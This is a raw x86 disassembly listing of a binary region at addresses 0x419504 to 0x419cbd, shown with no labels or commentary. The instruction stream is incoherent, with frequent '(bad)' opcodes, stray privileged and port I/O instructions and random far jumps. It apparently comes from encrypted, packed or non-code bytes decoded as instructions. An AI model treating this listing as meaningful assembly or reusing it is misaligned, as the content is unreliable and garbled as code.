  419504:	adc    DWORD PTR ss:[edx],esi
  419507:	add    al,0x25
  419509:	aaa    
  41950a:	push   ecx
  41950b:	cdq    
  41950c:	sbb    al,0x7c
  41950e:	iret   
  41950f:	call   0x83cc:0xc4d40590
  419516:	(bad)  
  419517:	pop    ecx
  419518:	cld    
  419519:	pop    ds
  41951a:	out    0x22,eax
  41951c:	mov    edi,0x5686b14e
  419521:	nop
  419522:	jns    0x41950e
  419524:	lods   al,BYTE PTR ds:[esi]
  419525:	mov    eax,0x5eeeb36
  41952a:	jne    0x419552
  41952c:	mov    bh,0xd7
  41952e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41952f:	sub    BYTE PTR [edx+eiz*1+0x5c52e1a4],dl
  419536:	push   eax
  419537:	jo     0x41959e
  419539:	ins    BYTE PTR es:[edi],dx
  41953a:	and    al,0xcf
  41953c:	outs   dx,DWORD PTR ds:[esi]
  41953d:	pop    ds
  41953e:	fdiv   DWORD PTR [edx-0x69]
  419541:	ror    BYTE PTR [ecx],1
  419543:	dec    ebx
  419544:	mov    ebp,0xb3108ebe
  419549:	fs gs xchg edx,eax
  41954c:	jle    0x419552
  41954e:	cmc    
  41954f:	shl    dl,cl
  419551:	out    dx,eax
  419552:	scas   al,BYTE PTR es:[edi]
  419553:	pop    esi
  419554:	sbb    DWORD PTR [ecx],eax
  419556:	push   esi
  419557:	push   esi
  419558:	inc    esi
  419559:	fs mov eax,ds
  41955c:	aas    
  41955d:	in     al,0x5c
  41955f:	inc    BYTE PTR es:[eax+0x3d]
  419563:	add    eax,0xf04f76d2
  419568:	pusha  
  419569:	imul   esp,DWORD PTR [eax+0x5],0x48
  41956d:	mov    edi,0x2489f8fa
  419572:	jae    0x41956f
  419574:	mov    ds:0x1fe6703b,al
  419579:	pop    ds
  41957a:	mov    eax,ds:0x14f3934e
  41957f:	dec    edi
  419580:	push   ss
  419581:	and    dl,bh
  419583:	lods   eax,DWORD PTR ds:[esi]
  419584:	rcl    DWORD PTR [eax-0x5f],cl
  419587:	ja     0x419579
  419589:	iret   
  41958a:	leave  
  41958b:	test   eax,0x1b9354f2
  419590:	xor    eax,0x65430b7
  419595:	xchg   edx,eax
  419596:	adc    dl,BYTE PTR [edi+0x6]
  419599:	stos   BYTE PTR es:[edi],al
  41959a:	sub    eax,0x82f7b37e
  41959f:	or     eax,0x387d6707
  4195a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195a5:	pop    ds
  4195a6:	pop    ebp
  4195a7:	mov    eax,ds:0x16df7c20
  4195ac:	pop    ds
  4195ad:	jl     0x4195ce
  4195af:	or     BYTE PTR [ebx-0x330d715c],ah
  4195b5:	push   eax
  4195b6:	pop    ebp
  4195b7:	out    0xb5,eax
  4195b9:	adc    eax,0x607eb6ad
  4195be:	je     0x419585
  4195c0:	inc    edx
  4195c1:	jns    0x419604
  4195c3:	pop    esi
  4195c4:	js     0x4195a1
  4195c6:	outs   dx,DWORD PTR ds:[esi]
  4195c7:	ds push es
  4195c9:	rol    edi,0xc4
  4195cc:	shl    eax,1
  4195ce:	fsubr  QWORD PTR [edi+edi*8]
  4195d1:	popa   
  4195d2:	aad    0x6a
  4195d4:	mov    edx,ecx
  4195d6:	dec    eax
  4195d7:	fcomp  QWORD PTR [ecx]
  4195d9:	fild   DWORD PTR [ecx+eax*2]
  4195dc:	mov    dh,0x2f
  4195de:	inc    ebx
  4195df:	popa   
  4195e0:	inc    edi
  4195e1:	mov    ecx,DWORD PTR [edi+0x52]
  4195e4:	cmp    DWORD PTR [ecx],ebp
  4195e6:	sbb    ax,sp
  4195e9:	sub    edx,eax
  4195eb:	push   ecx
  4195ec:	sbb    esi,ebp
  4195ee:	ret    0xac71
  4195f1:	jnp    0x419667
  4195f3:	fnstenv [ebp+0x30c02abd]
  4195f9:	mov    ebx,0xfa6e4430
  4195fe:	mov    BYTE PTR [ebx],dh
  419600:	jge    0x41967b
  419602:	inc    ebp
  419603:	mov    BYTE PTR ds:0x2e401bc4,dl
  419609:	aas    
  41960a:	and    al,0x34
  41960c:	hlt    
  41960d:	inc    edx
  41960e:	loop   0x41967b
  419610:	outs   dx,DWORD PTR ds:[esi]
  419611:	jo     0x41966a
  419613:	cdq    
  419614:	xor    al,0xad
  419616:	aaa    
  419617:	inc    edx
  419619:	int3   
  41961a:	mov    esp,DWORD PTR [ecx+0x739f1743]
  419620:	sbb    al,0x29
  419622:	cli    
  419623:	ins    DWORD PTR es:[edi],dx
  419624:	mov    ch,0x8b
  419626:	leave  
  419627:	adc    DWORD PTR [ecx],edx
  419629:	test   al,0x4b
  41962b:	sub    edi,DWORD PTR [ebp+0x8]
  41962e:	ficom  DWORD PTR [eax]
  419630:	sub    bh,BYTE PTR [esi-0x37]
  419633:	jno    0x41967e
  419635:	fld    DWORD PTR [ecx-0x69bb3c76]
  41963b:	int3   
  41963c:	jle    0x4195f3
  41963e:	sub    bh,BYTE PTR [edx]
  419640:	inc    eax
  419641:	mov    dl,0xcc
  419643:	mov    bl,0x91
  419645:	add    eax,0xa29ed269
  41964a:	repnz scas al,BYTE PTR es:[edi]
  41964c:	cmp    BYTE PTR [ecx+0x3f8916cf],cl
  419652:	cwde   
  419653:	lock aam 0x3
  419656:	xchg   edx,eax
  419657:	or     esp,DWORD PTR [ebp-0x89cf65e]
  41965d:	xchg   esp,eax
  41965e:	loopne 0x419678
  419660:	loopne 0x419620
  419662:	add    DWORD PTR [edx+0x4ab3dd91],esi
  419668:	outs   dx,BYTE PTR ds:[esi]
  419669:	jp     0x419647
  41966b:	ret    
  41966c:	adc    al,0xbd
  41966e:	jp     0x4196a9
  419670:	(bad)
  419673:	in     al,dx
  419674:	add    al,0xcf
  419676:	and    ebp,ecx
  419678:	hlt    
  419679:	or     ebx,esp
  41967b:	jmp    0x419643
  41967d:	inc    ebx
  41967e:	std    
  41967f:	mov    al,ds:0x3913fad4
  419684:	vmread DWORD PTR [ecx-0x30c7b791],esp
  41968b:	xchg   BYTE PTR [ebx+edi*8],cl
  41968e:	xor    cl,0x23
  419691:	xchg   DWORD PTR [eax+0xa95bdc9],eax
  419697:	jle    0x4196a9
  419699:	sahf   
  41969a:	call   0xcdcb:0x18b0253d
  4196a1:	mov    edi,DWORD PTR es:[edx]
  4196a4:	adc    ch,dh
  4196a6:	push   edx
  4196a7:	fisttp WORD PTR [edi+ebx*2-0x4e]
  4196ab:	xchg   ebx,eax
  4196ac:	lods   al,BYTE PTR ds:[esi]
  4196ad:	and    DWORD PTR ds:0x32641beb,ebp
  4196b3:	mov    esi,ebx
  4196b5:	icebp  
  4196b6:	mov    ch,0xe6
  4196b8:	xchg   ecx,eax
  4196b9:	pop    ecx
  4196ba:	adc    cx,WORD PTR [ebx+eiz*8]
  4196be:	lea    eax,[edx-0x49c2b7d3]
  4196c4:	pop    ebx
  4196c5:	xchg   ecx,eax
  4196c6:	std    
  4196c7:	jecxz  0x419717
  4196c9:	iret   
  4196ca:	and    eax,0xcf79655b
  4196cf:	lods   eax,DWORD PTR ds:[esi]
  4196d0:	aad    0x8f
  4196d2:	icebp  
  4196d3:	mov    cl,0xf1
  4196d5:	sbb    ebx,DWORD PTR [ebx-0xda929cc]
  4196db:	rcr    ebp,0x63
  4196de:	mov    esp,0x5e7ef887
  4196e3:	je     0x4196e1
  4196e5:	cmp    esi,ebx
  4196e7:	pop    ebx
  4196e8:	test   DWORD PTR [edi+0x70],ebp
  4196eb:	fabs   
  4196ed:	dec    edx
  4196ee:	mov    esp,DWORD PTR [eax-0x21]
  4196f1:	stos   BYTE PTR es:[edi],al
  4196f2:	cs popa 
  4196f4:	mov    eax,?
  4196f6:	fs test dl,0xde
  4196fa:	xor    al,0xb7
  4196fc:	adc    cl,BYTE PTR [eax+eiz*1-0x6165cf36]
  419703:	cdq    
  419704:	int3   
  419705:	jne    0x419773
  419707:	add    bh,ah
  419709:	stc    
  41970a:	push   es
  41970b:	fcomp  QWORD PTR [ecx+ecx*1]
  41970e:	pop    edx
  41970f:	and    esp,DWORD PTR [edx+edi*8+0x41]
  419713:	popa   
  419714:	push   ss
  419715:	dec    esi
  419716:	sub    ecx,DWORD PTR [esi+0x62]
  419719:	jbe    0x419786
  41971b:	sub    ch,ah
  41971d:	std    
  41971e:	pop    ss
  41971f:	idiv   BYTE PTR [ebx]
  419721:	jmp    0x4196dc
  419723:	shl    BYTE PTR [ebx-0x683b31e3],0x9e
  41972a:	cmp    ebp,DWORD PTR [ebx]
  41972c:	mov    ecx,0x79211e81
  419731:	push   ebp
  419732:	add    eax,0x5ff66a39
  419737:	mov    bh,0xaf
  419739:	inc    BYTE PTR [eax+0x25]
  41973c:	(bad)  
  41973d:	sbb    al,0xb0
  41973f:	fistp  QWORD PTR [ecx-0x8889391]
  419745:	test   DWORD PTR [eax+0x165fbd48],esp
  41974b:	adc    dh,BYTE PTR [edx]
  41974d:	sti    
  41974e:	stc    
  41974f:	jmp    0x4197af
  419751:	push   esp
  419752:	lahf   
  419753:	push   0x62b16f55
  419758:	or     esp,DWORD PTR [ebp-0x49ca984]
  41975e:	shr    DWORD PTR [ebp-0x69],1
  419761:	call   ecx
  419763:	push   edx
  419764:	das    
  419765:	jmp    0x41972e
  419767:	rcl    DWORD PTR [edi-0x50],1
  41976a:	sub    al,0xa4
  41976c:	loopne 0x4197b3
  41976e:	pop    ebx
  41976f:	xchg   esi,eax
  419770:	lea    esi,[esp+esi*2]
  419773:	fsub   st(2),st
  419775:	xor    eax,0x256f8578
  41977a:	xchg   BYTE PTR [edi+0x76],cl
  41977d:	test   eax,0xab3cf927
  419782:	or     cl,bh
  419784:	fst    DWORD PTR [esi-0x46294c99]
  41978a:	lahf   
  41978b:	inc    ecx
  41978c:	daa    
  41978d:	mov    ch,0xfa
  41978f:	mov    dx,0x9199
  419793:	dec    eax
  419794:	dec    ecx
  419795:	retf   0x62ca
  419798:	in     al,0xd9
  41979a:	out    0x8f,eax
  41979c:	imul   ebx,DWORD PTR [eax-0x13275a3d],0xd110a67f
  4197a6:	mov    ch,0xc8
  4197a8:	stos   BYTE PTR es:[edi],al
  4197a9:	xor    bl,dh
  4197ab:	mov    bl,0xe7
  4197ad:	mov    bl,0x35
  4197af:	loop   0x419738
  4197b1:	mov    ebx,0x9985b344
  4197b6:	fidiv  DWORD PTR [ebp-0x5365925]
  4197bc:	cs popf 
  4197be:	fistp  QWORD PTR ds:0x553e2630
  4197c4:	mov    ebx,DWORD PTR [ecx+0x3ab1b329]
  4197ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197cb:	xchg   DWORD PTR [ebp-0x26],ebx
  4197ce:	outs   dx,BYTE PTR ss:[esi]
  4197d0:	mov    ebx,0x74ca6597
  4197d5:	pop    ebp
  4197d6:	fidiv  DWORD PTR [edx]
  4197d8:	sahf   
  4197d9:	mov    eax,0x8f7fa780
  4197de:	xor    al,0x8
  4197e0:	pop    ebp
  4197e1:	push   esp
  4197e2:	arpl   WORD PTR [esi],bp
  4197e4:	repnz in eax,0xce
  4197e7:	jo     0x419781
  4197e9:	pop    ebx
  4197ea:	pop    ecx
  4197eb:	ret    0x962f
  4197ee:	push   esi
  4197ef:	push   0xffffffdd
  4197f1:	in     al,0x8
  4197f3:	enter  0x95e4,0xd9
  4197f7:	cld    
  4197f8:	or     DWORD PTR [edx],esp
  4197fa:	xchg   esp,eax
  4197fb:	out    dx,al
  4197fc:	stc    
  4197fd:	cmp    BYTE PTR [edx+0x36],bl
  419800:	jmp    0x419790
  419802:	xchg   dl,ah
  419804:	das    
  419805:	jnp    0x419794
  419807:	jp     0x41984a
  419809:	lds    edx,FWORD PTR [esi]
  41980b:	jge    0x4197e5
  41980d:	std    
  41980e:	call   FWORD PTR [ecx]
  419810:	add    al,0x53
  419812:	ins    BYTE PTR es:[edi],dx
  419813:	fsub   DWORD PTR [esi-0x1c6c4a5]
  419819:	rcr    DWORD PTR [edi-0x7275eff3],cl
  41981f:	fcmovne st,st(1)
  419821:	lahf   
  419822:	mov    edi,0xbe3bbd99
  419827:	adc    BYTE PTR [edi+0xd],0xf1
  41982b:	ret    0xa49e
  41982e:	shl    edi,1
  419830:	pop    edx
  419831:	dec    edi
  419832:	add    al,0xd1
  419834:	out    0x5,al
  419836:	mov    bl,0x69
  419838:	ds inc ebx
  41983a:	shl    eax,0xec
  41983d:	inc    edi
  41983e:	mov    dh,0xd9
  419840:	jne    0x4197d5
  419842:	test   al,0xa8
  419844:	dec    ecx
  419845:	cmp    eax,0x52797ced
  41984a:	out    dx,eax
  41984b:	fst    QWORD PTR [esi+0x4e1eb8d0]
  419851:	iret   
  419852:	sbb    DWORD PTR [ebx+esi*1],esp
  419855:	int3   
  419856:	push   0x48
  419858:	push   ebp
  419859:	pop    edx
  41985a:	repnz xor al,0x1b
  41985d:	test   esp,ebx
  41985f:	test   al,0x1
  419861:	mov    cl,0x1b
  419863:	adc    dl,BYTE PTR [esi-0x1a]
  419866:	add    eax,edi
  419868:	gs push ebp
  41986a:	mov    ecx,ecx
  41986c:	(bad)  
  41986d:	mov    edx,0x1cd29689
  419872:	xabort 0xf4
  419875:	and    al,dl
  419877:	frstor [ecx-0x62fa24da]
  41987d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41987e:	mov    al,0x54
  419880:	push   edx
  419881:	mov    fs:0xedfbdc34,eax
  419887:	cmp    al,0xc6
  419889:	adc    ah,BYTE PTR [esi]
  41988b:	pop    edx
  41988c:	retf   0x1efe
  41988f:	out    0x93,eax
  419891:	fwait
  419892:	iret   
  419893:	mov    esi,DWORD PTR [ecx]
  419895:	pop    esi
  419896:	xchg   esp,eax
  419897:	push   ecx
  419898:	shl    BYTE PTR [esi+0x64],cl
  41989b:	and    edx,edi
  41989d:	jmp    0x419879
  41989f:	fcomip st,st(7)
  4198a1:	and    esp,DWORD PTR [edi]
  4198a3:	mov    edi,DWORD PTR [ebx-0xb]
  4198a6:	mov    dl,BYTE PTR [edi-0x61b02f10]
  4198ac:	dec    ecx
  4198ad:	out    dx,al
  4198ae:	mov    bl,0xe4
  4198b0:	dec    edx
  4198b1:	mov    ecx,0xe64b4860
  4198b6:	pop    es
  4198b7:	pushf  
  4198b8:	cwde   
  4198b9:	imul   esi,DWORD PTR [ebx-0x20],0x6f
  4198bd:	mov    bl,0x48
  4198bf:	mov    BYTE PTR [ebp+0x4c8de1dd],ah
  4198c5:	ja     0x41986a
  4198c7:	aas    
  4198c8:	in     eax,dx
  4198c9:	sbb    cl,BYTE PTR [eax+0x51]
  4198cc:	std    
  4198cd:	or     bh,BYTE PTR [ebp+0x1b]
  4198d0:	mov    bl,0xff
  4198d2:	aad    0x9b
  4198d4:	xor    DWORD PTR [edx+edx*1],0x8f6e93b0
  4198db:	or     BYTE PTR [ebp-0x44dccbd7],dh
  4198e1:	jae    0x419952
  4198e3:	fs pop ecx
  4198e5:	sbb    BYTE PTR [ebx+esi*4+0x5fa51b83],dl
  4198ec:	xchg   esi,eax
  4198ed:	and    eax,0x3a
  4198f0:	xchg   esi,eax
  4198f1:	fst    QWORD PTR [ebp+edx*4+0x2c]
  4198f5:	mov    edi,0x4eda9c01
  4198fa:	mov    ebp,0x30cd04f6
  4198ff:	cmc    
  419900:	inc    esp
  419901:	sar    eax,1
  419903:	and    bh,BYTE PTR [esi-0x3a0901c7]
  419909:	jmp    0xe1b06816
  41990e:	jle    0x419930
  419910:	retf   
  419911:	lods   eax,DWORD PTR ds:[esi]
  419912:	test   al,0x38
  419914:	cwde   
  419915:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419916:	loop   0x41997c
  419918:	xchg   esp,eax
  419919:	jne    0x419957
  41991b:	jecxz  0x419997
  41991d:	mov    BYTE PTR [esi+0x32],bl
  419920:	push   esp
  419921:	push   ds
  419922:	pop    ecx
  419923:	mov    eax,ds:0x7cbdff68
  419928:	jns    0x4198f7
  41992a:	inc    eax
  41992b:	sbb    BYTE PTR [ebx],ah
  41992d:	mov    al,0xd0
  41992f:	icebp  
  419930:	sbb    ch,BYTE PTR ds:0x62b4123a
  419936:	stc    
  419937:	sbb    BYTE PTR [eax+edi*4+0x48],ch
  41993b:	shl    DWORD PTR [edi-0x59],0x10
  41993f:	add    cl,BYTE PTR [eax+0x987cb1c]
  419945:	jge    0x4198f8
  419947:	les    edx,FWORD PTR [edi+0x16]
  41994a:	jp     0x419952
  41994c:	mov    bl,0xd5
  41994e:	sti    
  41994f:	pop    es
  419950:	bound  edx,QWORD PTR [eax-0x19285495]
  419956:	sahf   
  419957:	jle    0x419903
  419959:	scas   eax,DWORD PTR es:[edi]
  41995a:	adc    ch,BYTE PTR [eax+0x32]
  41995d:	sub    DWORD PTR [esp+edx*4],edi
  419960:	popw   es
  419962:	push   ebp
  419963:	fld    DWORD PTR [esi]
  419965:	paddsw mm7,QWORD PTR [ebp-0x1]
  419969:	mov    BYTE PTR ds:[esi+0xf],ah
  41996d:	or     eax,0x52a5b015
  419972:	cdq    
  419973:	xchg   ecx,eax
  419974:	out    0x45,al
  419976:	push   0x72
  419978:	xor    DWORD PTR [esi],ebp
  41997a:	push   ebp
  41997b:	cmp    eax,0x24b2360e
  419980:	add    al,BYTE PTR [esi]
  419982:	push   edx
  419983:	push   edi
  419984:	push   ds
  419985:	xchg   esi,eax
  419986:	and    al,0x6d
  419988:	jno    0x419967
  41998a:	and    al,0x9f
  41998c:	sbb    dh,BYTE PTR [ebx+0x5d313661]
  419992:	cmp    BYTE PTR [edx+eax*1],cl
  419995:	in     al,dx
  419996:	jl     0x41998b
  419998:	sub    eax,0x32ca8761
  41999d:	xchg   ebx,eax
  41999e:	jg     0x4199d8
  4199a0:	jnp    0x419940
  4199a2:	or     al,0xf9
  4199a4:	adc    al,0x55
  4199a6:	mov    bl,0x2a
  4199a8:	and    eax,0x8f28eb5e
  4199ad:	and    BYTE PTR [eax+ebp*2],bh
  4199b0:	adc    BYTE PTR [edi],al
  4199b2:	mov    ecx,0x26ac558b
  4199b7:	jge    0x419995
  4199b9:	es push ebx
  4199bb:	in     al,0xa6
  4199bd:	and    ebx,eax
  4199bf:	sub    DWORD PTR [edx-0x4324ee8],esp
  4199c5:	xchg   esi,eax
  4199c6:	ss es dec ecx
  4199c9:	sub    eax,0x6347abd9
  4199ce:	cmp    eax,0x449d7e2c
  4199d3:	sti    
  4199d4:	int3   
  4199d5:	mov    WORD PTR [ebx],ss
  4199d7:	push   ds
  4199d8:	jge    0x4199fc
  4199da:	mov    edx,0xa3716f6
  4199df:	sar    bh,cl
  4199e1:	cmp    esp,0xffffffe2
  4199e4:	stos   DWORD PTR es:[edi],eax
  4199e5:	les    edx,FWORD PTR [ecx]
  4199e7:	xor    dl,ch
  4199e9:	fwait
  4199ea:	adc    eax,0x22594a1c
  4199ef:	sub    ch,BYTE PTR ds:0xbe777a8b
  4199f5:	test   ebx,esi
  4199f7:	icebp  
  4199f8:	(bad)  
  4199f9:	rcr    BYTE PTR [edx+0x3faf9ec1],1
  4199ff:	mov    bh,ah
  419a01:	adc    DWORD PTR [edi],eax
  419a03:	mov    ebx,0xdb4cba1b
  419a08:	js     0x4199b7
  419a0a:	enter  0x11c3,0x81
  419a0e:	push   ecx
  419a0f:	inc    esi
  419a10:	repz aaa 
  419a12:	and    esi,DWORD PTR [esi+0x7115b842]
  419a18:	push   esp
  419a19:	lea    ebp,[ebx-0xe12cbab]
  419a1f:	loopne 0x419a2a
  419a21:	sbb    al,0x3e
  419a23:	(bad)  
  419a24:	rol    BYTE PTR [ecx],1
  419a26:	pushf  
  419a27:	xor    BYTE PTR [edx],bl
  419a29:	inc    edx
  419a2a:	push   0x357f3679
  419a2f:	pop    edx
  419a30:	inc    ebx
  419a31:	mov    cl,0x4c
  419a33:	push   ebp
  419a34:	cmp    eax,0x4f637d96
  419a39:	push   ss
  419a3a:	jmp    0xdb0e:0x27840cb8
  419a41:	ja     0x419a68
  419a43:	stos   BYTE PTR es:[edi],al
  419a44:	cld    
  419a45:	or     cl,BYTE PTR [esi+0x252b6da7]
  419a4b:	ja     0x419a2b
  419a4d:	out    dx,al
  419a4e:	adc    BYTE PTR [edi],ah
  419a50:	xor    cl,cl
  419a52:	fnstsw WORD PTR [edx]
  419a54:	scas   al,BYTE PTR es:[edi]
  419a55:	cmp    ah,BYTE PTR [eax-0x64]
  419a58:	sbb    esi,DWORD PTR [edi-0x49609629]
  419a5e:	fcmovnu st,st(5)
  419a60:	jmp    0x1dbd:0x376e9cde
  419a67:	retf   
  419a68:	ja     0x419a48
  419a6a:	dec    ecx
  419a6b:	sahf   
  419a6c:	mov    eax,DWORD PTR [eax+0x78f12fb9]
  419a72:	mov    ds:0xa7e7467c,eax
  419a77:	leave  
  419a78:	scas   eax,DWORD PTR es:[edi]
  419a79:	cmp    esp,ebp
  419a7b:	and    ch,BYTE PTR [eax-0x14]
  419a7e:	and    BYTE PTR [edi],ch
  419a80:	stos   BYTE PTR es:[edi],al
  419a81:	xor    bh,BYTE PTR ds:0x843563b2
  419a87:	call   0x471eac08
  419a8c:	push   ss
  419a8d:	adc    edx,DWORD PTR [esi]
  419a8f:	sub    BYTE PTR [esi+0x6d],dh
  419a92:	fnstcw WORD PTR fs:[ebx]
  419a95:	sti    
  419a96:	inc    ebx
  419a97:	mov    ch,al
  419a99:	cmp    al,BYTE PTR [eax-0x4bc2d62b]
  419a9f:	pop    edx
  419aa0:	je     0x419a7d
  419aa2:	imul   DWORD PTR [ecx]
  419aa4:	xor    BYTE PTR [eax+0x53],ah
  419aa7:	xchg   bl,ah
  419aa9:	mov    ds:0x6bf535b5,eax
  419aae:	fnsave [ebx]
  419ab0:	add    al,0xe7
  419ab2:	pop    ebp
  419ab3:	jg     0x419a51
  419ab5:	and    cl,BYTE PTR ds:0xd4b17366
  419abb:	out    dx,eax
  419abc:	and    BYTE PTR [edi],bl
  419abe:	xor    al,0xc0
  419ac0:	sbb    BYTE PTR [ebx],0x50
  419ac3:	or     eax,ecx
  419ac5:	push   ebx
  419ac6:	mov    ds:0xa72acc54,eax
  419acb:	pop    es
  419acc:	push   es
  419acd:	fxch   st(4)
  419acf:	(bad)  
  419ad1:	pusha  
  419ad2:	ret    0x3fbe
  419ad5:	loopne 0x419ab9
  419ad7:	es icebp 
  419ad9:	xchg   esp,eax
  419ada:	pop    ds
  419adb:	mov    esp,0xc85c0341
  419ae0:	sub    eax,0xdad69db2
  419ae5:	push   ds
  419ae6:	lahf   
  419ae7:	(bad)  
  419ae8:	push   0x2
  419aea:	add    BYTE PTR [edi-0x13283570],al
  419af0:	mov    ds,WORD PTR [ebp-0x11e3393e]
  419af6:	loopne 0x419aae
  419af8:	shl    DWORD PTR [ecx],0x88
  419afb:	sub    DWORD PTR [ecx+0x6825c88a],esi
  419b01:	jns    0x419b0b
  419b03:	sti    
  419b04:	inc    ecx
  419b05:	repz jmp 0x419b18
  419b08:	scas   eax,DWORD PTR es:[edi]
  419b09:	xchg   esp,eax
  419b0a:	or     al,0x59
  419b0c:	cwde   
  419b0d:	fimul  DWORD PTR [esi+0x76]
  419b10:	loope  0x419afe
  419b12:	iret   
  419b13:	dec    esp
  419b14:	rcl    DWORD PTR [edi+ecx*4],0x78
  419b18:	dec    esp
  419b19:	and    bl,dl
  419b1b:	cmp    DWORD PTR [ecx+0x74],ebp
  419b1e:	jne    0x419b44
  419b20:	push   ebx
  419b21:	mov    eax,0x95e9a690
  419b26:	call   0x774d:0x3f388cec
  419b2d:	(bad)  [edx-0x63aff4aa]
  419b33:	adc    DWORD PTR [eax-0x50],ebp
  419b36:	fstp   DWORD PTR [esi-0x1c]
  419b39:	mov    dl,0x2a
  419b3b:	jmp    0x419b75
  419b3d:	mov    ch,0xb9
  419b3f:	add    edi,DWORD PTR [eax]
  419b41:	dec    edi
  419b42:	mov    cl,0x9f
  419b44:	out    0xf8,eax
  419b46:	sub    eax,DWORD PTR [edi]
  419b48:	popf   
  419b49:	cmp    al,0xb
  419b4b:	jp     0x419bb2
  419b4d:	icebp  
  419b4e:	inc    ebp
  419b4f:	xchg   edx,eax
  419b50:	fs mov edi,0x9bad506c
  419b56:	mov    ebp,0xf96794af
  419b5b:	loop   0x419af3
  419b5d:	leave  
  419b5e:	add    dx,dx
  419b61:	adc    DWORD PTR [eax-0x61],0xbc766974
  419b68:	pop    edx
  419b69:	imul   ebx,DWORD PTR [ebx],0xceb1cdf4
  419b6f:	inc    edi
  419b70:	push   eax
  419b71:	push   edx
  419b72:	push   0xaf99e22c
  419b77:	mov    DWORD PTR [ecx-0x2e01677a],esp
  419b7d:	jo     0x419b9d
  419b7f:	loop   0x419b1b
  419b81:	arpl   WORD PTR [ecx-0xa],di
  419b84:	mov    eax,0x21f52f20
  419b89:	and    BYTE PTR [edx],dl
  419b8b:	push   ds
  419b8c:	push   ebx
  419b8d:	and    ah,dl
  419b8f:	or     al,0x86
  419b91:	(bad)  
  419b92:	addr16 aaa 
  419b94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b95:	dec    eax
  419b96:	sbb    WORD PTR [ebp-0x15],bp
  419b9a:	and    eax,0xcce8cf
  419b9f:	ja     0x419c00
  419ba1:	and    al,0x2a
  419ba3:	dec    edi
  419ba4:	hlt    
  419ba5:	inc    esp
  419ba6:	jo     0x419b66
  419ba8:	dec    ebx
  419ba9:	imul   ebp,DWORD PTR [edi],0x5e00bcd7
  419baf:	push   0xa0a6ee34
  419bb4:	push   esi
  419bb5:	rcl    DWORD PTR [ebx+0x12],0xd9
  419bb9:	cdq    
  419bba:	in     eax,0xff
  419bbc:	mov    ch,0xad
  419bbe:	push   0x611e7433
  419bc3:	mov    bh,0xf7
  419bc5:	(bad)  
  419bc6:	mov    bh,0x19
  419bc8:	popa   
  419bc9:	loopne 0x419be8
  419bcb:	push   esi
  419bcc:	shl    DWORD PTR [ebx],1
  419bce:	sbb    bl,BYTE PTR [ebx]
  419bd0:	pop    esi
  419bd1:	xchg   esp,eax
  419bd2:	push   ebp
  419bd3:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bd5:	jmp    0x419b78
  419bd7:	jae    0x419c43
  419bd9:	stos   BYTE PTR es:[edi],al
  419bda:	das    
  419bdb:	shl    DWORD PTR [esi],0xe7
  419bde:	mov    ebx,0x64868072
  419be3:	xor    DWORD PTR [eax],eax
  419be5:	aas    
  419be6:	in     al,0x60
  419be8:	and    dh,ah
  419bea:	pop    esp
  419beb:	jno    0x419c36
  419bed:	fnstcw WORD PTR [esi-0x3e73b39a]
  419bf3:	fwait
  419bf4:	dec    esp
  419bf5:	sti    
  419bf6:	out    0x1b,al
  419bf8:	ins    BYTE PTR es:[edi],dx
  419bf9:	in     eax,dx
  419bfa:	call   0xbc4e:0xe5d32b6b
  419c01:	in     al,dx
  419c02:	jmp    0x4514bd5c
  419c07:	iret   
  419c08:	stos   DWORD PTR es:[edi],eax
  419c09:	or     esp,DWORD PTR [esi+eax*4]
  419c0c:	jae    0x419c25
  419c0e:	push   es
  419c0f:	xchg   edi,eax
  419c10:	xor    eax,0x8724bbe
  419c15:	mov    ebx,0x38b73065
  419c1a:	mov    ss,WORD PTR [edx]
  419c1c:	pop    ebx
  419c1d:	sbb    BYTE PTR cs:[edx-0x15],bh
  419c21:	arpl   WORD PTR [edx-0x62d120ec],cx
  419c27:	je     0x419c32
  419c29:	mov    ds:0xe744d981,al
  419c2e:	jb     0x419c71
  419c30:	inc    ecx
  419c31:	cli    
  419c32:	push   ebp
  419c33:	inc    eax
  419c34:	ror    BYTE PTR [ebp-0x4a],1
  419c37:	ds pop ss
  419c39:	dec    eax
  419c3a:	lahf   
  419c3b:	mov    ds:0x6e81368b,eax
  419c40:	push   ecx
  419c41:	out    dx,eax
  419c42:	sub    esp,DWORD PTR [esi+0x55d41068]
  419c48:	out    0x1e,eax
  419c4a:	bound  ebp,QWORD PTR [edx]
  419c4c:	mov    bl,0x84
  419c4e:	sub    BYTE PTR ds:0xf97bd774,0xe3
  419c55:	dec    edx
  419c56:	mov    es,esp
  419c58:	ins    BYTE PTR es:[edi],dx
  419c59:	mov    ah,0x60
  419c5b:	neg    DWORD PTR [edx]
  419c5d:	call   0x72aeb9e2
  419c62:	push   0xffffffcc
  419c64:	jnp    0x419c39
  419c66:	popa   
  419c67:	sbb    DWORD PTR [ecx],0x22
  419c6a:	and    edx,DWORD PTR [edx-0x7a]
  419c6d:	mov    al,0xb2
  419c6f:	add    al,bl
  419c71:	test   DWORD PTR [ebx+0x6fb622fb],ebx
  419c77:	cmp    ah,BYTE PTR [ebx]
  419c79:	leave  
  419c7a:	rol    eax,0x99
  419c7d:	push   ds
  419c7e:	add    ch,bh
  419c80:	sbb    ebx,DWORD PTR [esi+0x68]
  419c83:	ror    BYTE PTR [eax+0x51],cl
  419c86:	fcomp  DWORD PTR [ebx+0x62]
  419c89:	xor    BYTE PTR [ebp+0x2c],cl
  419c8c:	mov    ch,0xd4
  419c8e:	sbb    bl,BYTE PTR [ebp+0x2c]
  419c91:	data16 mov BYTE PTR ds:[ebx],bh
  419c95:	pushf  
  419c96:	sub    BYTE PTR [ebx-0x5],al
  419c99:	sub    ebx,DWORD PTR [eax+ebp*1+0x19]
  419c9d:	adc    esp,DWORD PTR [edi+ebp*4+0x69]
  419ca1:	aaa    
  419ca2:	jmp    0x616c1f0a
  419ca7:	jge    0x419c40
  419ca9:	mov    dh,0x9
  419cab:	int    0xa8
  419cad:	mov    bh,0xab
  419caf:	jmp    0x419d13
  419cb1:	fld    DWORD PTR [edi+0x8c51303]
  419cb7:	jle    0x419d08
  419cb9:	scas   al,BYTE PTR es:[edi]
  419cba:	pop    es
  419cbb:	js     0x419c56
  419cbd:	add    cl,BYTE PTR [eax]
